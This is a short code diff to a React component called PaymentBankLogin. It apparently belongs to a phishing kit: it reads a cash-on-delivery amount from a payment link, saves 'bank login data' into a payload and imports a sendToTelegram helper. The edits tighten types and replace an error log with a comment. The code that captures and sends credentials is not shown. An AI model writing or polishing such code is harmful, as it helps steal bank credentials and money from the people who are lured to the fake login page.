@@ -12,6 +12,7 @@ import { sendToTelegram } from "@/lib/telegram";
 import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import type { ShippingInfo } from "@/types/payment";
 
 const PaymentBankLogin = () => {
   const { id } = useParams();
@@ -47,7 +48,7 @@ const PaymentBankLogin = () => {
   // Get country from link data
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
 
-  const shippingInfo = linkData?.payload as any;
+  const shippingInfo = linkData?.payload as ShippingInfo | undefined;
 
   // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
@@ -194,7 +195,7 @@ const PaymentBankLogin = () => {
           payload: updatedPayload
         });
       } catch (error) {
-        console.error('Error saving bank login data:', error);
+        // Error saving bank login data
       }
     }
     
